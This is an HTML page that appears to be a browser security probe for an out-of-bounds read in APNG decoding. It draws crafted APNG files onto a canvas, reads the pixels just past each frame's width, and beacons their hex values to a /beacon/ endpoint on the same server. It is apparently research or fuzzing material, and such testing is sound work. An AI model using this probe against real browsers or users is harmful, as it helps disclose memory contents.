<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>V947B</title></head>
<body><pre id="out">V947B — APNG OOB window (wide dump, repeats, B)</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
function bk(tag,body){
  try{new Image().src='/beacon/V947B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
}
function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
function pxh(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
function loadImg(src,n){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+n+'_'+Math.random(); }); }
async function run(name,src,fullW,fullH,frW,frH,iter){
  bk('T-PRE',name+'#'+iter);
  try{
    var im=await loadImg(src,iter);
    var c=document.createElement('canvas'); c.width=fullW; c.height=fullH;
    var ctx=c.getContext('2d'); ctx.clearRect(0,0,fullW,fullH); ctx.drawImage(im,0,0);
    var d=ctx.getImageData(0,0,fullW,fullH).data;
    var rows=[0,1,2,3,Math.max(0,frH-1)];
    var x0=Math.max(0,frW-4), x1=Math.min(fullW-1,frW+15);
    for(var ri=0;ri<rows.length;ri++){
      var y=rows[ri]; if(y>=fullH) continue;
      var parts=[];
      for(var x=x0;x<=x1;x++) parts.push(x+':'+pxh(d,fullW,x,y));
      bk('W',name+'#'+iter+'|y'+y+'|'+parts.join(' '));
    }
  }catch(e){ bk('T-ERR',name+'#'+iter+'|'+String(e&&e.message||e).slice(0,140)); }
}
(async function(){
  bk('BOOT','window x=frW-4..frW+15, rows=0,1,2,3,frH-1, iters=3');
  for(var it=0;it<3;it++){
    await run('f64_fr16','v946b_f64_fr16.apng',64,64,16,16,it);
    await run('f64_fr32','v946b_f64_fr32.apng',64,64,32,32,it);
    await run('f128_fr16','v946b_f128_fr16.apng',128,64,16,16,it);
  }
  bk('DONE','complete');
  say('\nV947B complete.');
})();
</script>
</body></html>
